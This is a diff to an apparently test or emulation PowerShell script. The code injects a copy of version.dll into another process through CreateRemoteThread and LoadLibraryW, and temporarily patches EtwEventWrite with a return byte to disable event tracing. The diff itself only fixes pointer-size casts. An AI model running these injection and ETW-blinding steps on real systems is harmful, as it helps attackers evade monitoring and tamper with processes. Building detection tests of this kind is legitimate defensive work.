@@ -55,9 +55,9 @@ try {
   $dll = Join-Path $work 'version.dll'
   Copy-Item "$env:SystemRoot\System32\version.dll" $dll
   $bytes = [Text.Encoding]::Unicode.GetBytes($dll + "`0")
-  $mem = [Adv]::VirtualAllocEx($h, [IntPtr]::Zero, [UIntPtr]$bytes.Length, 0x3000, 0x04)
+  $mem = [Adv]::VirtualAllocEx($h, [IntPtr]::Zero, [UIntPtr][uint64]$bytes.Length, 0x3000, 0x04)
   $w = [UIntPtr]::Zero
-  [void][Adv]::WriteProcessMemory($h, $mem, $bytes, [UIntPtr]$bytes.Length, [ref]$w)
+  [void][Adv]::WriteProcessMemory($h, $mem, $bytes, [UIntPtr][uint64]$bytes.Length, [ref]$w)
   $ll = [Adv]::GetProcAddress([Adv]::GetModuleHandle('kernel32.dll'), 'LoadLibraryW')
   $tid = 0
   $t = [Adv]::CreateRemoteThread($h, [IntPtr]::Zero, [UIntPtr]::Zero, $ll, $mem, 0, [ref]$tid)
@@ -67,14 +67,14 @@ try {
   # ---- T7: patch EtwEventWrite (same ntdll base in every process this boot) -----
   $etw = [Adv]::GetProcAddress([Adv]::GetModuleHandle('ntdll.dll'), 'EtwEventWrite')
   $orig = New-Object byte[] 1; $r = [UIntPtr]::Zero
-  [void][Adv]::ReadProcessMemory($h, $etw, $orig, [UIntPtr]1, [ref]$r)
+  [void][Adv]::ReadProcessMemory($h, $etw, $orig, [UIntPtr][uint64]1, [ref]$r)
   $old = [uint32]0
-  [void][Adv]::VirtualProtectEx($h, $etw, [UIntPtr]1, 0x40, [ref]$old)
-  [void][Adv]::WriteProcessMemory($h, $etw, [byte[]](0xC3), [UIntPtr]1, [ref]$w)
+  [void][Adv]::VirtualProtectEx($h, $etw, [UIntPtr][uint64]1, 0x40, [ref]$old)
+  [void][Adv]::WriteProcessMemory($h, $etw, [byte[]](0xC3), [UIntPtr][uint64]1, [ref]$w)
   Write-Host ("T7: patched EtwEventWrite at 0x{0:X} (orig byte 0x{1:X2}); waiting 75 s" -f [int64]$etw, $orig[0])
   Start-Sleep -Seconds 75
-  [void][Adv]::WriteProcessMemory($h, $etw, $orig, [UIntPtr]1, [ref]$w)
-  [void][Adv]::VirtualProtectEx($h, $etw, [UIntPtr]1, $old, [ref]$old)
+  [void][Adv]::WriteProcessMemory($h, $etw, $orig, [UIntPtr][uint64]1, [ref]$w)
+  [void][Adv]::VirtualProtectEx($h, $etw, [UIntPtr][uint64]1, $old, [ref]$old)
   Write-Host 'T7: restored original byte'
 } finally {
   [void][Adv]::CloseHandle($h)
